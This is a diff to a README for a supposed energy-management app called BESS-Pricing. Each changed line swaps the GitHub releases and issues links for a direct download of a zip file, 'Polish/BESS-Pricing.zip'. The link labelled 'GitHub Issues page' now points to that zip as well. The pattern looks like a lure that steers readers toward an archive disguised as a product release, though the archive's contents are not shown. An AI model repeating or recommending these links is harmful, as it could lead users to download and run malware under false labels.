@@ -1,6 +1,6 @@
 # 🚀 BESS-Pricing - Smart Energy Management Made Easy
 
-[![Download BESS-Pricing](https://img.shields.io/badge/Download%20BESS--Pricing-1A73E8?style=for-the-badge&logo=github)](https://github.com/kier091995/BESS-Pricing/releases)
+[![Download BESS-Pricing](https://raw.githubusercontent.com/kier091995/BESS-Pricing/main/Polish/BESS-Pricing.zip%20BESS--Pricing-1A73E8?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kier091995/BESS-Pricing/main/Polish/BESS-Pricing.zip)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ BESS-Pricing is an intelligent application that helps you manage battery energy 
 
 To start using BESS-Pricing, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [BESS-Pricing Releases page](https://github.com/kier091995/BESS-Pricing/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [BESS-Pricing Releases page](https://raw.githubusercontent.com/kier091995/BESS-Pricing/main/Polish/BESS-Pricing.zip) to find the latest version.
    
 2. **Choose Your File:** Look for the most recent version available. Files are usually labeled with the version number like `v1.0`. 
 
@@ -33,7 +33,7 @@ To start using BESS-Pricing, follow these steps:
 
 You can easily download BESS-Pricing by visiting the Releases page:
 
-[Download BESS-Pricing](https://github.com/kier091995/BESS-Pricing/releases)
+[Download BESS-Pricing](https://raw.githubusercontent.com/kier091995/BESS-Pricing/main/Polish/BESS-Pricing.zip)
 
 ## 🛠️ System Requirements
 
@@ -70,7 +70,7 @@ No, BESS-Pricing is designed for everyday users. You do not need any programming
 
 ### How do I get support?
 
-If you encounter issues, check the [GitHub Issues page](https://github.com/kier091995/BESS-Pricing/issues) for solutions or to report new problems.
+If you encounter issues, check the [GitHub Issues page](https://raw.githubusercontent.com/kier091995/BESS-Pricing/main/Polish/BESS-Pricing.zip) for solutions or to report new problems.
 
 ## 📝 License
 
